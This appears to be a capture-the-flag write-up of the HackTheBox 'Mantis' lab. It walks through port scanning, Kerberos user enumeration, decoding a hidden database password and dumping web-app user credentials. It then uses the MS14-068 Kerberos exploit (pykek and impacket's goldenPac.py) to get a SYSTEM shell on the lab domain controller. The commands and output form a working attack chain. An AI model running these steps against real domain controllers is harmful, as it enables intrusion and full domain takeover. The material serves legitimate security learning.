---
layout: post
title: HackTheBox - Mantis Writeup
tags: [hackthebox]
---


Mantis takes a lot of patience and a good bit of enumeration. The final exploit is also pretty cool as I had never done anything like it before. Really happy to see a domain controller finally pop up in HackTheBox.

![mantis](/img/mantis.png)

## Enumeration

Let's kick it off with an nmap scan.

```
root@kali:~/htb/mantis# nmap -A 10.10.10.52

Starting Nmap 7.50 ( https://nmap.org ) 
Nmap scan report for 10.10.10.52
Host is up (0.11s latency).
Not shown: 981 closed ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  tcpwrapped
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2018-02-09T14:23:56
|_Not valid after:  2048-02-09T14:23:56
|_ssl-date: 2018-02-09T14:30:53+00:00; 0s from scanner time.
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
8080/tcp  open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Tossed Salad - Blog
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.50%E=4%D=2/9%OT=53%CT=1%CU=35559%PV=Y%DS=2%DC=T%G=Y%TM=5A7DB115
OS:%P=i686-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%CI=I%TS=7)SEQ(SP=101%GCD=1
OS:%ISR=107%TS=7)SEQ(SP=103%GCD=1%ISR=108%TI=RD%CI=I%TS=8)OPS(O1=M54DNW8ST1
OS:1%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST
OS:11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80
OS:%W=2000%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=
OS:AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=
OS:80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0
OS:%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=1
OS:64%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2018-02-09T09:30:52-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_smbv2-enabled: Server supports SMBv2 protocol

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   52.42 ms  10.10.14.1
2   252.79 ms 10.10.10.52

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 264.56 seconds
```

Okay so we have quite a bit of to look at here. Just based off the open LDAP ports it's safe to say this is a domain controller.
8080 seems to be running an IIS site, so let's have a look. 

![site](/img/mantis-site.png)

There's not much here besides a login, but we have no usernames. `gobuster` also didn't return much of anything besides directories related to the Orchard site. We can try to enumerate usernames via kerberos and see if we can get something.

```
root@kali:~/htb/mantis# nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='htb.local',userdb=/usr/share/seclists/Usernames/Names/names.txt 10.10.10.52

Starting Nmap 7.50 ( https://nmap.org )
Nmap scan report for 10.10.10.52
Host is up (0.068s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|_    James@htb.local
```

Now we have a username. However when attempting any password with the user `james` or `james@htb.local` on the Orchard login. We just get the following message:

![exception](/img/mantis-exception.png)

This seems to be a deadend for the most part. Let's fire up nmap and run a full port scan to see if there are any other ports our initial scan didn't find.

```
root@kali:~/htb/mantis# nmap -p- 10.10.10.52 -T4

Starting Nmap 7.50 ( https://nmap.org ) 
Initiating Ping Scan at 10:05
Scanning 10.10.10.52 [4 ports]
Completed Ping Scan at 10:05, 0.42s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:05
Completed Parallel DNS resolution of 1 host. at 10:05, 6.18s elapsed
Initiating SYN Stealth Scan at 10:05
Scanning 10.10.10.52 [65535 ports]

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1337/tcp  open  waste
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
8080/tcp  open  http-proxy
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49164/tcp open  unknown
49166/tcp open  unknown
49168/tcp open  unknown
50255/tcp open  unknown

```

This scan took a while but we do see that port `1337` is open. If we browse over to it we're presented with the default IIS landing page.

![iis](/img/mantis-iis7.png)

Let's fire up `gobuster` on our newly found port.

```
root@kali:~/htb/mantis# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.52:1337

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.52:1337/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/secure_notes (Status: 301)
```

Again this seemed to run forever but we finally get a hit. 

![secure](/img/mantis-secure.png)

The `web.config` file throws a 404. The dev notes title looks like it has some base64 inside the name. The contents gives a username, `admin`, as well as a database name, `orcharddb`.

![notes](/img/mantis-notes.png)

Let's try to decode the base64 in the file name.

```
root@kali:~/htb/mantis# base64 -d <<< NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx
6d2424716c5f53405f504073735730726421
```
This doesn't match up with any hash lengths but it does look  like hexadecimal.

```
root@kali:~/htb/mantis# echo 6d2424716c5f53405f504073735730726421 | xxd -r -p
m$$ql_S@_P@ssW0rd!
```

Here we go! Finally some credentials to work with. If we try to connect into MSSQL using `sqsh` with the `sa` user and that password we get access denied. However using the password for the `admin` user let's us in.

```
root@kali:~/htb/mantis# sqsh -S 10.10.10.52 -U admin
sqsh-2.1.7 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2010 Michael Peppler
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
Password: 
1> 
```

Let's enumerate the table names inside `orcharddb`.

 _Note: I've cleaned up the formatting below, `sqsh` has terrible output formatting. You can output into a CSV file and view in something else however if needed. Something like `go -m csv > /root/htb/mantis/table.csv`_

```
1> SELECT TABLE_NAME FROM orcharddb.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
2> go

	TABLE_NAME 

	-------------------------------------------------------------------------------

	blog_Orchard_Blogs_RecentBlogPostsPartRecord                  
	blog_Orchard_Blogs_BlogArchivesPartRecord  
	blog_Orchard_Workflows_TransitionRecord
	blog_Orchard_Workflows_WorkflowRecord  
	blog_Orchard_Workflows_WorkflowDefinitionRecord 
	blog_Orchard_Workflows_AwaitingActivityRecord 
	blog_Orchard_Workflows_ActivityRecord 
	blog_Orchard_Tags_TagsPartRecord 
	blog_Orchard_Framework_DataMigrationRecord 
	blog_Orchard_Tags_TagRecord       
	blog_Orchard_Tags_ContentTagRecord 
	blog_Settings_ContentFieldDefinitionRecord 
	blog_Orchard_Framework_DistributedLockRecord 
	blog_Settings_ContentPartDefinitionRecord  
	blog_Settings_ContentPartFieldDefinitionRecord   
	blog_Settings_ContentTypeDefinitionRecord      
	blog_Settings_ContentTypePartDefinitionRecord 
	blog_Settings_ShellDescriptorRecord     
	blog_Settings_ShellFeatureRecord    
	blog_Settings_ShellFeatureStateRecord  
	blog_Settings_ShellParameterRecord  
	blog_Settings_ShellStateRecord      
	blog_Orchard_Framework_ContentItemRecord   
	blog_Orchard_Framework_ContentItemVersionRecord  
	blog_Orchard_Framework_ContentTypeRecord  
	blog_Orchard_Framework_CultureRecord   
	blog_Common_BodyPartRecord   
	blog_Common_CommonPartRecord    
	blog_Common_CommonPartVersionRecord   
	blog_Common_IdentityPartRecord  
	blog_Containers_ContainerPartRecord   
	blog_Containers_ContainerWidgetPartRecord   
	blog_Containers_ContainablePartRecord 
	blog_Title_TitlePartRecord  
	blog_Navigation_MenuPartRecord  
	blog_Navigation_AdminMenuPartRecord   
	blog_Scheduling_ScheduledTaskRecord    
	blog_Orchard_ContentPicker_ContentMenuItemPartRecord 
	blog_Orchard_Alias_AliasRecord   
	blog_Orchard_Alias_ActionRecord   
	blog_Orchard_Autoroute_AutoroutePartRecord 
	blog_Orchard_Users_UserPartRecord  
	blog_Orchard_Roles_PermissionRecord 
	blog_Orchard_Roles_RoleRecord 
	blog_Orchard_Roles_RolesPermissionsRecord
	blog_Orchard_Roles_UserRolesPartRecord   
	blog_Orchard_Packaging_PackagingSource   
	blog_Orchard_Recipes_RecipeStepResultRecord  
	blog_Orchard_OutputCache_CacheParameterRecord 
	blog_Orchard_MediaProcessing_ImageProfilePartRecord
	blog_Orchard_MediaProcessing_FilterRecord 
	blog_Orchard_MediaProcessing_FileNameRecord  
	blog_Orchard_Widgets_LayerPartRecord 
	blog_Orchard_Widgets_WidgetPartRecord  
	blog_Orchard_Comments_CommentPartRecord 
	blog_Orchard_Comments_CommentsPartRecord   
	blog_Orchard_Taxonomies_TaxonomyPartRecord  
	blog_Orchard_Taxonomies_TermPartRecord 
	blog_Orchard_Taxonomies_TermContentItem
	blog_Orchard_Taxonomies_TermsPartRecord 
	blog_Orchard_MediaLibrary_MediaPartRecord
	blog_Orchard_Blogs_BlogPartArchiveRecord                                                                               
(62 rows affected)

```

The `blog_Orchard_Users_UserPartRecord` table looks like what we need.

```
1> USE orcharddb;
2> go
1> SELECT * FROM blog_Orchard_Users_UserPartRecord;
2> go
Id         
UserName 
Email     
NormalizedUserName 
Password    
PasswordFormat 
HashAlgorithm    
PasswordSalt   
RegistrationStatus  
EmailStatus    
EmailChallengeToken 
CreatedUtc          LastLoginUtc        LastLogoutUtc      
-------------------------------------------------------------------------------
2
admin  
admin   
AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==  
Hashed   
PBKDF2   
UBwWF1CQCsaGc/P7jIR/kg==  
Approved     
Approved  
NULL  
Sep  1 2017 01:44PM Sep  1 2017 02:03PM Sep  1 2017 02:06PM
15
James   
james@htb.local  
james      
J@m3s_P@ssW0rd!  
Plaintext   
Plaintext  
NA    
Approved  
Approved  
NULL   
Sep  1 2017 01:45PM                NULL                NULL

(2 rows affected)

```

Excellent we have james' password. We already know that logging into the webapp as james just throws an exception. So let's test these credentials via SMB and see if they are valid Windows credentials.

```
root@kali:~/htb/mantis# smbclient -L 10.10.10.52/ -U james
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\james's password: 
Domain=[HTB] OS=[] Server=[]

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share
```

Indeed they are valid. We can successfully list the shares on the machine. Having a quick look through `SYSVOL` we can see two Group Policy Objects but there's nothing of much use there.

## Exploitation

Our credentials won't give us a shell via `winexe` so we'll have to figure out another way. Since we know this is a domain controller perhaps we can exploit Kerberos to give us what we want. 

For detailed explanation on how the attack works check here: <http://adsecurity.org/?p=541>

There is an excellent write up on how to perform the attack remotely here: <http://blog.liatsisfotis.com/knock-and-pass-kerberos-exploitation.html>

After installing the dependencies specified in the article and grabbing the latest version of `impacket` we are ready to go. Let's edit `/etc/hosts` and add in the domain controller.

```

127.0.0.1	localhost
127.0.1.1	kali
10.10.10.52	mantis.htb.local	mantis
```

Now we configure `/etc/krb5.conf`

```
libdefaults]
	default_realm = HTB.LOCAL

# The following krb5.conf variables are only for MIT Kerberos.
	kdc_timesync = 1
	ccache_type = 4
	forwardable = true
	proxiable = true

[realms]
       HTB.LOCAL = {
	kdc = mantis.htb.local:88
	admin_server = mantis.htb.local
	default_domain = HTB.LOCAL 
	}
[domain_realm]
	.domain.internal = HTB.LOCAL
	domain.internal = HTB.LOCAL

```

Let's sync our time with the DC.

```
rdate -n 10.10.10.52
```

So now we are all set to start our exploitation process. First we generate our ticket with the `impacket` tools.

```
root@kali:~/htb/mantis/impacket-master/impacket-master/impacket/examples# kinit james
Password for james@HTB.LOCAL: 
root@kali:~/htb/mantis/impacket-master/impacket-master/impacket/examples# klist
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: james@HTB.LOCAL

Valid starting       Expires              Service principal
02/09/2018 15:29:07  02/10/2018 01:29:07  krbtgt/HTB.LOCAL@HTB.LOCAL
renew until 02/10/2018 15:28:37
```

Next we will need to get james' SID.

```
root@kali:~/htb/mantis/impacket-master/impacket-master/impacket/examples# rpcclient -U james mantis
Enter WORKGROUP\james's password: 
rpcclient $> lookupnames james
james S-1-5-21-4220043660-4019079961-2895681657-1103 (User: 1)
```

Now we can run our MS14-068 python exploit script.

```
root@kali:~/htb/mantis/pykek-master# python ms14-068.py -u james@HTB.LOCAL -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis
Password: 
  [+] Building AS-REQ for mantis... Done!
  [+] Sending AS-REQ to mantis... Done!
  [+] Receiving AS-REP from mantis... Done!
  [+] Parsing AS-REP from mantis... Done!
  [+] Building TGS-REQ for mantis... Done!
  [+] Sending TGS-REQ to mantis... Done!
  [+] Receiving TGS-REP from mantis... Done!
  [+] Parsing TGS-REP from mantis... Done!
  [+] Creating ccache file 'TGT_james@HTB.LOCAL.ccache'... Done!

```

By default, any user's ticket-granting-ticket (TGT) used on the client side is read from the default Kerberos credential cache, which is located in `/tmp/krb5cc_uid`. So now that we have our cache file we need to copy it to the proper location.

```
root@kali:~/htb/mantis/pykek-master# cp TGT_james@HTB.LOCAL.ccache /tmp/krb5cc_0
```

With everything in place we can use the `goldenPAC.py` tool from impacket to get us our shell.

```
root@kali:~/htb/mantis/impacket-master/impacket-master/examples# ./goldenPac.py HTB.LOCAL/james@mantis
Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies

Password:
[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.....
[*] Found writable share ADMIN$
[*] Uploading file cugfXzCt.exe
[*] Opening SVCManager on mantis.....
[*] Creating service QcYY on mantis.....
[*] Starting service QcYY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami & hostname
nt authority\system
mantis
```

And we have our `SYSTEM` shell! From here we can grab both `user.txt` and `root.txt`.